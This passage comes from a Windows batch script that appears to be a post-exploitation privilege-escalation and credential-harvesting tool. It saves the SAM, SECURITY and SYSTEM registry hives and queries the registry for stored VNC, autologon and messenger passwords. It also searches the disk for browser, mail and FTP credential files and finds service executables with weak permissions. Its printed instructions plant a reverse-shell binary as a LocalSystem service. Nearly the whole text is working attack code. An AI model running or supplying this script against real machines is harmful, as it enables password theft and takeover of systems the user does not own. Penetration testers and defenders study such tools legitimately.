echo :::... List localgroup administrators ...:::
echo :------------------
net localgroup administrators

echo :------------------
echo :::... List all localgroup domain administrators ...:::
echo :------------------
net localgroup administrators /domain

echo :------------------
echo :::... List domain administrators group ...:::
echo :------------------
net group "Domain Admins" /domain

echo :------------------
echo :::... List enterprise domain administrators group ...:::
echo :------------------
net group "Enterprise Admins" /domain

echo :------------------
echo :::... List domain controllers administrators group ...:::
echo :------------------
net group "Domain Controllers" /domain

echo :------------------
echo :::... List the hostnames of the IP ...:::
echo :------------------
for /F "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do nbtstat -a %%a

echo :------------------
echo :::... Check any sharing on network ...:::
echo :------------------
net share

echo :------------------
echo :::... ARP cache recent connection ...:::
echo :------------------
arp -a

echo :------------------
echo :::... Show the rouing of the current network ...:::
echo :------------------
route print

echo :::... END of checknetworkdomain ...:::
echo :
echo :
goto:eof

REM System configuration such as local group and group policy
:checksystemconfig
echo :------------------
ECHO :::... List system files and program files ...:::
echo :------------------

echo :------------------
echo :::... Export group policy results ...:::
echo :------------------
gpresult /z

echo :------------------
echo :::... Check hosts file ...:::
echo :------------------
type %windir%\system32\drivers\etc\hosts 2>&1

echo :------------------
echo :::... List of folders in program files ...:::
echo :------------------
dir "%programfiles%" 2>&1

echo :------------------
echo :::... List all folders in program files x86 ...:::
echo :------------------
dir "%programfiles(x86)%" 2>&1

REM Finding important files and weak folders permissions
echo :------------------
echo :::... Check important files and weak folders permissions ...:::
echo :------------------

echo :------------------
echo :::... List of logicaldisk in user machine ...:::
echo :------------------
for /f "skip=1 delims=" %%a in ('wmic logicaldisk get caption') do echo %%a

echo :------------------
echo :::... List files in C ...:::
echo :------------------
if exist CdriveTree.txt del CdriveTree.txt
tree C:\ /f /a > CdriveTree.txt

REM Check for any following folders inside
REM	%windir%\repair\sam
REM	%windir%\repair\system
REM	%windir%\repair\software
REM	%windir%\repair\security
REM	%windir%\iis[5,6,7].log
REM	%windir%\system32\logfiles\httperr\httper1.log
REM	$windir%\system32\logfiles\w3svc1\exYYMMDD.log
REM	%windir%\system32\config\AppEvent.Evt
REM	%windir%\system32\config\SecEvent.Evt
REM	%windir%\system32\config\default.sav
REM	%windir%\system32\config\security.sav
REM	%windir%\system32\config\software.sav
REM	%windir%\system32\config\system.sav
REM	%windir%\system32\CCM\logs\*.log


echo :------------------
echo :::... Check for ntuser.dat registry files ...:::
echo :------------------
dir "%userprofile%"

echo :::... END of checksystemconfig ...:::
echo :
echo :
goto:eof

REM Check for remote access 
:checkremoteaccess

echo :------------------
echo :::... Check for remote access available ...:::
echo :------------------
net share 

echo :------------------
echo :::... Show remote task on the computer ...:::
echo :::... ### Caution ### This will remove IPC$ connection ...:::
echo :------------------
REM tasklist /V /S [computername]

REM check for remote access
REM qwinsta /SERVER:computername
REM qprocess /SERVER:computername
REM mstsc /v:SERVER:PORT
REM net use \\computername
REM net use \\computername /user:DOMAINNAME\username password
REM net time \\computername	# show the time of the computername
REM dir \\computername\share

echo :::... END of checkremoteaccess ...:::
echo :
echo :
goto:eof

REM check for auto start dir 
:checkautostart
echo :
echo :------------------
echo :::... Auto start dir ...:::
echo :------------------
echo :::... %systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup ...:::
dir "%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 2>&1
echo :
echo :
echo :::... %systemdrive%\Documents and Settings\All Users\Start Menu\Programs\StartUp ...:::
dir "%systemdrive%\Documents and Settings\All Users\Start Menu\Programs\StartUp" 2>&1
echo :
echo :
echo :::... %systemdrive%\Windows\Start Menu\Programs\StartUp ...:::
dir "%systemdrive%\Windows\Start Menu\Programs\StartUp" 2>&1
echo :
echo :
echo :::... %systemdrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp ...:::
dir "%systemdrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp" 2>&1
echo :
echo :

echo :::... END of checkautostart ...:::
echo :
echo :
goto:eof

REM WMIC Kung Fu 
:checkwmicfu
if exist wmickungfu.txt del wmickungfu.txt
echo :------------------ >wmickungfu.txt
echo :::... WMIC Kung Fu ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt

echo :------------------ >>wmickungfu.txt
echo :::... BIOS Information ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" bios list full | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows Hotfix Listing ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" qfe get hotfixid, installedon, installdate, installedby | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows Startup ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" startup get caption, command, location, user /format:list | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows Services ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" service get caption, name, servicetype, startmode, state, processid, pathname /format:list | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows OS Information ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" os get caption, csdversion, csname, osarchitecture, version /format:list | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows Current Process ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" process get caption, executablepath, commandline, processid /format:list | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows installed programs ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" product get caption, installdate, installlocation, packagecache, vendor, version /format:list | more 1>nul 2>&1

echo :::... END of checkwmicfu ...::: >>wmickungfu.txt
echo : >>wmickungfu.txt
echo : >>wmickungfu.txt
goto:eof

REM Check for unquoted service path
:checkunquoted
echo :------------------
echo :::... Windows Service Unquoted Path ...:::
echo :------------------
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v "\""

echo :::... END of checkunquoted ...::: 
echo : 
echo :
goto:eof

REM Registry command (Most of the time require Administrator)
:checkregistry
echo :------------------ 
echo :::... Save registry hive ...::: 
echo :------------------ 

echo :------------------ 
echo :::... Save HKLM Security Hive ...::: 
echo :------------------ 
if exist regsecurity.hive del regsecurity.hive
reg save HKLM\Security regsecurity.hive 2>&1

echo :------------------ 
echo :::... Save HKLM System Hive ...::: 
echo :------------------ 
if exist regsystem.hive del regsystem.hive
reg save HKLM\System regsystem.hive 2>&1

echo :------------------ 
echo :::... Save HKLM SAM Hive ...::: 
echo :------------------ 
if exist regsam.hive del regsam.hive
reg save HKLM\SAM regsam.hive 2>&1

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find "0x1" 1> NUL
IF %ERRORLEVEL% == 0 (
        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find "0x1" 1> NUL
        IF %ERRORLEVEL% == 0 (set alwaysinstallelevated=1)
)
reg query "HKCU\SOFTWARE\Microsoft\Protected Storage System Provider" /v "Protected Storage" 1>NUL
IF %ERRORLEVEL% == 0 (set IE6found=1)
reg query "HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2" 1>NUL
IF %ERRORLEVEL% == 0 (set IE7found=1)
reg query "HKCU\SOFTWARE\America Online\AIM6\Passwords" 1>NUL
IF %ERRORLEVEL% == 0 (set AIM6found=1)
reg query "HKCU\SOFTWARE\AIM\AIMPRO" 1>NUL
IF %ERRORLEVEL% == 0 (set AIMPROfound=1)
reg query "HKCU\SOFTWARE\Beyluxe Messenger" 1>NUL
IF %ERRORLEVEL% == 0 (set BEYLUXEfound=1)
reg query "HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting" 1>NUL
IF %ERRORLEVEL% == 0 (set BIGANTfound=1)
reg query "HKCU\SOFTWARE\Camfrog\Client" 1>NUL
IF %ERRORLEVEL% == 0 (set CAMFROGfound=1)
reg query "HKCU\SOFTWARE\Google\Google Talk\Accounts" 1>NUL
IF %ERRORLEVEL% == 0 (set GOOGLETALKfound=1)
reg query "HKCU\SOFTWARE\IMVU" 1>NUL
IF %ERRORLEVEL% == 0 (set IMVUfound=1)
reg query "HKCU\SOFTWARE\Nimbuzz\PCClient\Application" 1>NUL
IF %ERRORLEVEL% == 0 (set NIMBUZZfound=1)
reg query "HKCU\SOFTWARE\Paltalk" 1>NUL
IF %ERRORLEVEL% == 0 (set PALTALKfound=1)
reg query "HKCU\SOFTWARE\Yahoo\Pager" 1>NUL
IF %ERRORLEVEL% == 0 (set YAHOOPAGERfound=1)
reg query "HKCU\SOFTWARE\IncrediMail" 1>NUL
IF %ERRORLEVEL% == 0 (set INCREDIMAILfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK2013found=1)
reg query "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK2010POSTNTfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK2010PRENTfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK98MAILONLYfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK98NORMALfound=1)
reg query "HKCU\SOFTWARE\Adobe\Common\10\Sites" 1>NUL
IF %ERRORLEVEL% == 0 (set DREAMWEAVERfound=1)
reg query "HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail" 1>NUL
IF %ERRORLEVEL% == 0 (set GMAILDESKTOPfound=1)
reg query "HKCU\SOFTWARE\DownloadManager\Passwords" 1>NUL
IF %ERRORLEVEL% == 0 (set IDMfound=1)
reg query "HKCU\SOFTWARE\Google\Picasa" 1>NUL
IF %ERRORLEVEL% == 0 (set PICASAfound=1)
reg query HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter 1>NUL
IF %ERRORLEVEL% == 0 (set IPRouteEnable=1)
reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set realvncpassfound=1)
reg query HKLM\Software\TightVNC\Server /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set tightvncpassfound1=1)
reg query HKLM\Software\TightVNC\Server /v PasswordViewOnly | Find "PasswordViewOnly" 1> NUL
IF %ERRORLEVEL% == 0 (set tightvncpassfound2=1)
reg query HKLM\Software\TigerVNC\WinVNC4 /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set tigervncpassfound=1)
reg query HKLM\SOFTWARE\ORL\WinVNC3\Default /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set vnc3passfound1=1)
reg query HKLM\SOFTWARE\ORL\WinVNC3 /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set vnc3passfound2=1)
reg query HKCU\Software\ORL\WinVNC3 /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set vnc3passfound3=1)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword | Find "DefaultPassword" 1> NUL
IF %ERRORLEVEL% == 0 (
        For /F "Tokens=2*" %%a In ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword') Do set defaultloginpass=%%b    
        REM we check if the registry key is not null
        IF NOT [%defaultloginpass%] == [] set winautologinpassfound=1
        set defaultloginpass=
)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUsername | Find "DefaultUsername" 1> NUL
IF %ERRORLEVEL% == 0 (set winautologinuserfound=1)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultDomainname | Find "DefaultDomainname" 1> NUL
IF %ERRORLEVEL% == 0 (set winautologindomainfound=1)

echo :::... END of checkregistry ...::: 
echo : 
echo :
goto:eof

REM Looking for password in all the files (This will take quite long)
REM securityxploded dot com slash passwordsecrets dot php
:checkpasswords
echo :------------------ 
echo :::... Look for passwords ...::: 
echo :------------------ 
findstr /sic:"password=" /sic:"passwd=" /sic:"pass=" /sic:"pwd=" /sic:"secretcode=" *.txt *.xml *.ini \ > foundpass.txt
echo :------------------ 
echo :::... End for look for passwords ...::: 
echo :------------------ 
goto:eof

REM Looking for password in all the files (This will take quite long)
:findinterestingfiles
echo :------------------
echo :::... Interesting files and directories ...:::
echo :------------------
dir C:\* /a/s/b > dirlisting.txt
type dirlisting.txt | findstr /I \.*proof[.]txt$
type dirlisting.txt | findstr /I \.*network-secret[.]txt$
type dirlisting.txt | findstr /I \.*ssh.*[.]ini$
type dirlisting.txt | findstr /I \.*ultravnc[.]ini$
type dirlisting.txt | findstr /I \.*vnc[.]ini$
type dirlisting.txt | findstr /I \.*bthpan[.]sys$
type dirlisting.txt | findstr /I \.*\\repair$
type dirlisting.txt | findstr /I \.*passw*. | findstr /VI \.*.chm$ | findstr /VI \.*.log$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$
type dirlisting.txt | findstr /I \.*[.]vnc$
type dirlisting.txt | findstr /I \.*groups[.]xml$
type dirlisting.txt | findstr /I \.*printers[.]xml$
type dirlisting.txt | findstr /I \.*drives[.]xml$
type dirlisting.txt | findstr /I \.*scheduledtasks[.]xml$
type dirlisting.txt | findstr /I \.*services[.]xml$
type dirlisting.txt | findstr /I \.*datasources[.]xml$
type dirlisting.txt | findstr /I \.*.rsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.rat$
type dirlisting.txt | findstr /I \.*.dsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$ | findstr /VI \.*.gif$ | findstr /VI \.*.handsafe[.]reg$
type dirlisting.txt | findstr /I \.*[.]dbx$
type dirlisting.txt | findstr /I \.*.account.*.$ | findstr /VI \.*.User.Account.Picture.*. | findstr /VI \.*.bmp$
type dirlisting.txt | findstr /I \.*ntds[.].*$
type dirlisting.txt | findstr /I \.*hiberfil[.].*$
type dirlisting.txt | findstr /I \.*boot[.]ini$
type dirlisting.txt | findstr /I \.*win[.]ini$
type dirlisting.txt | findstr /I \.*.\\config\\RegBack
type dirlisting.txt | findstr /I \.*.\\CCM\\logs
type dirlisting.txt | findstr /I \.*.\\iis.[.]log$
type dirlisting.txt | findstr /I \.*.\\Content.IE.\\index.dat$
type dirlisting.txt | findstr /I \.*.\\inetpub\\logs\\LogFiles
type dirlisting.txt | findstr /I \.*.\\httperr\\httpe.*.[.]log$
type dirlisting.txt | findstr /I \.*.\\logfiles\\w3svc1\\ex.*.[.]log$
type dirlisting.txt | findstr /I \.*.\\Panther\\ | findstr /VI \.*.Resources\\Themes\\.*.
type dirlisting.txt | findstr /I \.*.syspre.*,[.]...$
type dirlisting.txt | findstr /I \.*.unatten.*.[.]txt$
type dirlisting.txt | findstr /I \.*.unatten.*.[.]xml$
type dirlisting.txt | findstr /I \.*Login.Data$
type dirlisting.txt | findstr /I \.*Web.Data$
type dirlisting.txt | findstr /I \.*Credentials.Store$
type dirlisting.txt | findstr /I \.*Credential.Store$
type dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*
REM Avant Browser:
type dirlisting.txt | findstr /I \.*forms[.]dat[.]vdt$
type dirlisting.txt | findstr /I \.*default\\formdata\\forms[.]dat$
REM Comodo Dragon
type dirlisting.txt | findstr /I \.*Dragon\\User.Data\\Default.*
REM CoolNovo
type dirlisting.txt | findstr /I \.*ChromePlus\\User.Data\\Default.*
REM Firefox
type dirlisting.txt | findstr /I \.*Firefox\\Profiles\\.*[.]default$
type dirlisting.txt | findstr /I \.*key3[.]db$
REM Flock Browser
type dirlisting.txt | findstr /I \.*Flock\\User.Data\\Default.*
REM Google Chrome
type dirlisting.txt | findstr /I \.*Chrome\\User.Data\\Default.*
type dirlisting.txt | findstr /I \.*Chrome.SXS\\User.Data\\Default.*
REM Internet Explorer
type dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*
REM Maxthon
type dirlisting.txt | findstr /I \.*MagicFill.*
type dirlisting.txt | findstr /I \.*MagicFill2[.]dat$
REM Opera
type dirlisting.txt | findstr /I \.*Wand[.]dat$
REM Safari
type dirlisting.txt | findstr /I \.*keychain[.]plist$
REM SeaMonkey
type dirlisting.txt | findstr /I \.*signons[.]sqlite$
REM AIM
type dirlisting.txt | findstr /I \.*aimx[.]bin$
REM Digsby
type dirlisting.txt | findstr /I \.*logininfo[.]yaml$
type dirlisting.txt | findstr /I \.*digsby[.]dat$
REM Meebo Notifier
type dirlisting.txt | findstr /I \.*MeeboAccounts[.]txt$
REM Miranda IM
type dirlisting.txt | findstr /I \.*Miranda\\.*[.]dat$
REM MySpace IM
type dirlisting.txt | findstr /I \.*MySpace\\IM\\users[.]txt$
REM Pidgin
type dirlisting.txt | findstr /I \.*Accounts[.]xml$
REM Skype
type dirlisting.txt | findstr /I \.*Skype.*config[.]xml$
REM Tencent QQ
type dirlisting.txt | findstr /I \.*Registry[.]db$
REM Trillian
type dirlisting.txt | findstr /I \.*accounts[.]ini$
REM XFire
type dirlisting.txt | findstr /I \.*XfireUser[.]ini$
REM Foxmail
type dirlisting.txt | findstr /I \.*Account[.]stg$
type dirlisting.txt | findstr /I \.*Accounts[.]tdat$
REM ThunderBird
type dirlisting.txt | findstr /I \.*signons[.]sqlite$
REM Windows Live Mail
type dirlisting.txt | findstr /I \.*[.]oeaccount$
REM FileZilla
type dirlisting.txt | findstr /I \.*recentservers[.]xml$
REM FlashFXP
type dirlisting.txt | findstr /I \.*Sites[.]dat$
REM FTPCommander
type dirlisting.txt | findstr /I \.*Ftplist[.]txt$
REM SmartFTP
type dirlisting.txt | findstr /I \.*SmartFTP.*[.]xml$
REM WS_FTP
type dirlisting.txt | findstr /I \.*ws_ftp[.]ini$
REM Heroes of Newerth
type dirlisting.txt | findstr /I \.*login[.]cfg$
REM JDownloader
type dirlisting.txt | findstr /I \.*JDownloader.*
type dirlisting.txt | findstr /I \.*database[.]script$
type dirlisting.txt | findstr /I \.*accounts[.]ejs$
REM OrbitDownloader
type dirlisting.txt | findstr /I \.*sitelogin[.]dat$
REM Seesmic
type dirlisting.txt | findstr /I \.*data[.]db$
REM SuperPutty
type dirlisting.txt | findstr /I \.*sessions[.]xml$
REM TweetDeck
type dirlisting.txt | findstr /I \.*TweetDeck.*
type dirlisting.txt | findstr /I \.*[.]localstorage$
echo :------------------ 
echo :::... End for Interesting files and directories ...::: 
echo :------------------ 
goto:eof

:checkweakpermissions
echo :-----
echo :::... Searching for weak service permissions (this can take a while) ...:::
echo :------
if exist serviceexes.txt del serviceexes.txt
if exist dirlisting.txt del dirlisting.txt
dir \ /a/s/b > dirlisting.txt
for /f "tokens=1 delims=," %%a in ('tasklist /SVC /FO CSV ^| findstr /I \.*exe*. ^| findstr /VI "smss.exe csrss.exe winlogon.exe services.exe spoolsv.exe explorer.exe ctfmon.exe wmiprvse.exe msmsgs.exe notepad.exe lsass.exe svchost.exe findstr.exe cmd.exe tasklist.exe"') do (findstr %%a$ | findstr /VI "\.*winsxs\\*.") <dirlisting.txt >> serviceexes.txt

for /f "tokens=*" %%a in (serviceexes.txt) do (cacls "%%a"|findstr /I "Users:"|findstr /I "W F") && (echo === !!! Write access to service executable: %%a !!! ===) || (call)
for /f "tokens=*" %%a in (serviceexes.txt) do (cacls "%%a"|findstr /I "Everyone"|findstr /I "W F") && (echo === !!! Write access to service executable: %%a !!! ===) || (call)
 
echo :------------------
echo :::... Files and folder with Read-Write access ...:::
echo :------------------
dir accesschk.exe /a/s/b 1>2>NUL
IF %ERRORLEVEL% == 0 (
        echo === NOTE: accesschk.exe not found, skipping accesschk file permissions checks ===
        goto:eof
)
 
        accesschk.exe /accepteula 1>2>NUL
       
        accesschk.exe -uwqs "Everyone" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
        accesschk.exe -uwqs "Users" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
        accesschk.exe -uwqs "Authenticated Users" c:\*.*  | findstr /VI \.*System.Volume.Information*. | findstr /VI \.*Documents.And.Settings*.
       
        echo.Searching for weak service permissions
        echo.--------------------------------------
        accesschk.exe -uwcqv "Authenticated Users" * | Find "RW " 1> NUL
        if %ERRORLEVEL% == 0 (
                echo.**** !!! VULNERABLE SERVICES FOUND - Authenticated Users!!! ****
                accesschk.exe -uwcqv "Authenticated Users" *
                echo.****************************************************************
                echo.
        )
        accesschk.exe /accepteula 1>2>NUL
        accesschk.exe -uwcqv "Users" * | Find "RW " 1> NUL
        if %ERRORLEVEL% == 0 (
                echo.**** !!! VULNERABLE SERVICES FOUND - All Users !!! ****
                accesschk.exe -uwcqv "Users" *
                echo.*******************************************************
                echo.To plant binary in service use:
                echo.sc config [service_name] binpath= "C:\rshell.exe"
                echo.sc config [service_name] obj= ".\LocalSystem" password= ""
                echo.sc qc [service_name] (to verify!)
                echo.net start [service_name]
                echo.*******************************************************
        )
        accesschk.exe /accepteula 1>2>NUL
        accesschk.exe -uwcqv "Everyone" * | Find "RW " 1> NUL
        if %ERRORLEVEL% == 0 (
                echo.**** !!! VULNERABLE SERVICES FOUND - Everyone !!! ****
                accesschk.exe -uwcqv "Everyone" *
                echo.*******************************************************
                echo.To plant binary in service use:
                echo.sc config [service_name] binpath= "C:\rshell.exe"
                echo.sc config [service_name] obj= ".\LocalSystem" password= ""
                echo.sc qc [service_name] (to verify!)
                echo.net start [service_name]
                echo.*******************************************************
		)
		
echo :------------------ 
echo :::... End for Files and folder with Read-Write access ...::: 
echo :------------------ 
goto:eof

:cleanup
set accesschk=
set OSbit=
set whoami=
set runningelevatedprompt=
set netshfirewall=
set OSVersion=
set alwaysinstallelevated=
set realvncpassfound=
set tightvncpassfound1=
set tightvncpassfound2=
set tigervncpassfound=
set vnc3passfound1=
set vnc3passfound2=
set vnc3passfound3=
set winautologinpassfound=
set winautologindomainfound=
set winautologinuserfound=
set defaultloginpass=
set IE6found=
set IE7found=
set AIM6found=
set AIMPROfound=
set BEYLUXEfound=
set BIGANTfound=
set CAMFROGfound=
set GOOGLETALKfound=
set IMVUfound=
set NIMBUZZfound=
set PALTALKfound=
set YAHOOPAGERfound=
set INCREDIMAILfound=
set OUTLOOK2013found=
set OUTLOOK2010POSTNTfound=
set OUTLOOK2010PRENTfound=
set OUTLOOK98MAILONLYfound=
set OUTLOOK98NORMALfound=
set IPEnableRouter=
goto:eof

:end
echo :------------------ 
echo :::... DONE! ...::: 
echo :------------------ 
GOTO:eof





